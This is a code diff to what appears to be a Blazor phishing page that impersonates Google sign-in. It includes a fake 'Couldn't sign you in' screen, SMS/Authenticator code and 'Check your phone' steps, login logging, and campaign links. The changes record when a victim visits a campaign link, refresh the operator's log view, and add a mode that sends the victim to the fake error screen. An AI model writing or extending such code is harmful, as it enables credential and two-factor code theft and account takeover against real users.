@@ -1,5 +1,4 @@
 @page "/{**Slug}"
-@page "/login/{**Slug}"
 @rendermode InteractiveServer
 @inject NavigationManager Nav
 @inject LoginLogService LogService
@@ -35,8 +34,7 @@ else if (_step == 6)
         <GoogleLogo />
         <div class="dummy-icon"><span class="material-icons">error_outline</span></div>
         <h2 class="dummy-title">Couldn't sign you in</h2>
-        <p class="dummy-sub">This browser or app may not be secure. To sign in, try a different browser.</p>
-        <a class="dummy-link" href="/">Try again</a>
+        @* <p class="dummy-sub">This browser or app may not be secure. To sign in, try a different browser.</p> *@
     </div>
 }
 
@@ -367,6 +365,8 @@ else
             if (link is not null)
             {
                 _campaignLinkId = link.Id;
+                await CampaignService.MarkVisitedAsync(link.Id);
+                AppState.NotifyLogsChanged();
                 if (link.IsLocked)
                 {
                     if (link.PageMode == 3)
@@ -393,6 +393,7 @@ else
             {
                 1 => 3,   // Code page (SMS / Authenticator)
                 2 => 7,   // Gmail app "Check your phone"
+                4 => 6,   // Error — "Couldn't sign you in"
                 _ => 5    // Loading — stay on spinner
             };
             StateHasChanged();
